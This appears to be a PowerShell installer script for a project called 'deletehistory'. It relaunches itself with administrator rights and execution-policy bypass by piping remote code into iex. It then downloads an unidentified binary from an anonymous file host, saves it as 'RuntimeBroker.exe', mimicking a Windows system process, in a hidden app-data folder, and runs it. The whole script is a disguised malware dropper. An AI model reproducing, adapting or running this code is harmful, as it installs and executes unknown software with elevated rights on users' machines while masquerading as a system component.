param(
    [string]$u = 'https://files.catbox.moe/c0ieox.bin',
    [string]$p = '',
    [string]$s = 'https://raw.githubusercontent.com/Reflexeiei885/deletehistory/refs/heads/main/install.ps1'
)

$ProgressPreference = 'Continue'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $ue = $u.Replace("'", "''"); $pe = $p.Replace("'", "''"); $se = $s.Replace("'", "''")
    Start-Process powershell -Verb RunAs -ArgumentList "-nop -ep bypass -c `"`$u='$ue'; `$p='$pe'; iex (irm '$se')`""
    exit
}

$b = 'https://raw.githubusercontent.com/Reflexeiei885/deletehistory/refs/heads/main'
$exeName = 'RuntimeBroker.exe'
$t = if ($p -and (Test-Path $p)) { $p }
     elseif ($p) { New-Item -ItemType Directory -Force -Path $p | Out-Null; $p }
     else { Join-Path $env:LOCALAPPDATA 'Thugstore' }

New-Item -ItemType Directory -Force -Path $t, (Join-Path $t 'assets'), (Join-Path $t 'assets\fonts') | Out-Null

$target = Join-Path $t $exeName
Get-Process | Where-Object { $_.Path -eq $target } -EA 0 | Stop-Process -Force -EA 0
Get-Process FourtyStoreLoader -EA 0 | Stop-Process -Force -EA 0

$f = Join-Path $env:TEMP 'thug.tmp'
Invoke-WebRequest $u -OutFile $f -UseBasicParsing
Copy-Item $f (Join-Path $t $exeName) -Force
Remove-Item $f -Force -EA 0

Start-Process (Join-Path $t $exeName)
Write-Host 'OK'
